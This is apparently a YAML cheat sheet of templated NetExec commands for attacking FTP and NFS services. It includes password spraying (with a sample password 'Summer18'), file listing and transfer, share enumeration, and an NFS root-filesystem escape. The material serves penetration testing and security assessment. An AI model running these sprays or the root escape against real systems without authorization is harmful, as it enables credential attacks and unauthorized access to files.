  - title: nxc ftp - basic authentication
    desc: |
      Authenticate to FTP server with username and password. Tests FTP
      credentials. No (Pwn3d!) check for FTP protocol.
    command: "nxc ftp {{target}} -u {{username}} -p {{password}}"

  - title: nxc ftp - password spray
    desc: |
      Password spray against FTP servers. Tests credentials against multiple
      FTP hosts. Use --no-bruteforce for 1:1 user:password mapping.
    command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"

  - title: nxc ftp - password spray with continue on success
    desc: |
      Password spray continuing after successful login. Useful for spraying
      single password against large user list.
    command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"

  - title: nxc ftp - list files
    desc: |
      List files on FTP server. Enumerates files and directories in FTP
      share. Useful for reconnaissance.
    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --list"

  - title: nxc ftp - get file from remote
    desc: |
      Download file from FTP server. Transfers file from remote to local
      system via FTP.
    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"

  - title: nxc ftp - put file to remote
    desc: |
      Upload file to FTP server. Transfers local file to remote system via FTP.
    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"

  # ============================================================================
  # NFS PROTOCOL
  # ============================================================================

  - title: nxc nfs - enumerate NFS server
    desc: |
      Enumerate NFS server information. Detects supported NFS versions and
      checks for root escape vulnerability.
    command: "nxc nfs {{target}}"

  - title: nxc nfs - enumerate shares
    desc: |
      Enumerate exported NFS shares. Lists all available NFS shares with
      permissions, storage usage, and access lists.
    command: "nxc nfs {{target}} --shares"

  - title: nxc nfs - list files on share
    desc: |
      List files on specific NFS share. Shows files and directories in
      specified share path.
    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --ls {{path|/}}"

  - title: nxc nfs - enumerate shares recursively
    desc: |
      Enumerate all files recursively on NFS shares. Recursively discovers
      files and folders with specified depth (default 3).
    command: "nxc nfs {{target}} --enum-shares"

  - title: nxc nfs - enumerate with custom depth
    desc: |
      Enumerate shares with custom recursion depth. Specify depth for
      recursive enumeration (default is 3 layers).
    command: "nxc nfs {{target}} --enum-shares {{depth|5}}"

  - title: nxc nfs - download file
    desc: |
      Download file from NFS share. Transfers file from remote NFS share
      to local system.
    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"

  - title: nxc nfs - upload file
    desc: |
      Upload file to NFS share. Transfers local file to remote NFS share.
    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"

  - title: nxc nfs - escape to root filesystem
    desc: |
      Attempt root filesystem escape on NFS. Exploits NFS misconfiguration
      to access root filesystem. Requires root escape vulnerability.
    command: "nxc nfs {{target}} --root-escape"

